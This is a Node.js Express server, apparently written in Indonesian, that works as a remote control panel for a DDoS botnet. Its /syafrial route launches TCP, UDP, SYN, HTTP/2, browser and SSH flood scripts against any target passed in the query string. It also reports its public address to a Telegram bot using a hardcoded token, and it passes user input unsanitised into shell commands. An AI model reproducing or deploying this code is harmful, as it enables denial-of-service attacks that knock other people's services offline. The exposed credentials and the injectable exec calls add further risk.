const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 5032;
const botToken = '7747846109:AAFlultkVbhkCekpsm4JhKwb3vFvK0Antv0';
const ownerId = '7601313881';
function sendToBot(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  axios.post(url, {
    chat_id: ownerId,
    text: message,
    parse_mode: 'Markdown'
  }).catch(() => {});
}
async function fetchData() {
  try {
    const res = await fetch('https://httpbin.org/get');
    const data = await res.json();
    console.log(`\n[] Endpoint Aktif: http://${data.origin}:${port}/syafrial\n`);
    sendToBot(` *Endpoint Aktif*\nhttp://${data.origin}:${port}/syafrial`);
  } catch {
    console.log(`[!] Gagal ambil IP publik. Tetap jalan di port ${port}`);
  }
}

app.get('/syafrial', (req, res) => {
  const { target, time, methods, command } = req.query;

  if (command) {
    if (command === 'reboot') {
      exec('reboot', (error) => {
        if (error) {
          return res.status(500).json({ error: 'Failed to reboot' });
        }
        return res.json({ status: 'Reboot command sent' });
      });

    } else if (command === 'pm2_restart') {
      exec('pm2 restart all', (error) => {
        if (error) {
          return res.status(500).json({ error: 'Failed to restart PM2' });
        }
        return res.json({ status: 'PM2 restarted' });
      });
    } else {
      return res.status(400).json({ error: 'Unsupported command' });
    }
    return;
  }
  if (!target || !time) {
    return res.status(400).json({ error: 'command tidak sesuai dengan method' });
  }
  const isIpPort = /^\d{1,3}(\.\d{1,3}){3}:\d+$/.test(target);
  if (isIpPort) {
    const [ip, port] = target.split(':');
    if (!methods || methods === 'tcp') {
      exec(`./tcp ${ip} ${port} 6 ${time}`);
      return res.json({ status: 'running TCP (L4)', ip, port, time });
    }
    if (methods === 'udp') {
      exec(`./udp ${ip} ${port} ${time}`);
      return res.json({ status: 'running UDP (L4)', ip, port, time });
    }
    if (methods === 'syn') {
      exec(`node raw.js ${ip} ${port} ${time}`);
      return res.json({ status: 'running syn (L4)', ip, port, time });
    }
    return res.status(400).json({ error: 'Unsupported L4 method' });
  }
  
  ///\\\\
  
  if (!methods || methods === 'flood') {
    exec(`node h2-flood.js ${target} ${time} 12 22 proxy.txt`);
    return res.json({ status: 'running flood.js (L7)', target, time });
  }
  if (!methods || methods === 'mix') {
    exec(`node h2-flood.js ${target} ${time} 12 22`);
    return res.json({ status: 'running flood.js (L7)', target, time });
  }
  if (!methods || methods === 'koliros') {
    exec(`node koliros.js ${target} ${time} 12 22 proxy.txt`);
    return res.json({ status: 'running flood.js (L7)', target, time });
  }
  if (!methods || methods === 'sigma') {
    exec(`node sigma.js ${target} ${time} 12 22 proxy.txt`);
    return res.json({ status: 'running flood.js (L7)', target, time });
  }
  if (!methods || methods === 'blast') {
    exec(`node h2-blast.js ${target} ${time} 12 22 proxy.txt`);
    return res.json({ status: 'running jembut (L7)', target, time });
  }
  if (methods === 'browser') {
    exec(`node bro.js ${target} 8 x.txt 4 ${time}`);
    return res.json({ status: 'running browser.js (L7)', target, time });
  }
  if (methods === 'idk') {
    exec(`node idk.js ${target} ${time} 22 8 proxy.txt`);
    return res.json({ status: 'running ninja (L7)', target, time });
  }
  if (methods === 'sshflood') {
    const parts = target.split(':');
    if (parts.length !== 3) {
      return res.status(400).json({ error: 'Format target sshflood salah. Gunakan ip:port:user' });
    }
    const [ip, port, user] = parts;
    exec(`node sshflood.js ${ip} ${port} ${user} ${time}`);
    return res.json({ status: 'running sshflood.js', ip, port, user, time });
  }
  res.status(400).json({ error: 'Method tidak didukung atau target tidak valid' });
});

app.listen(port, '0.0.0.0', () => {
  fetchData();
});
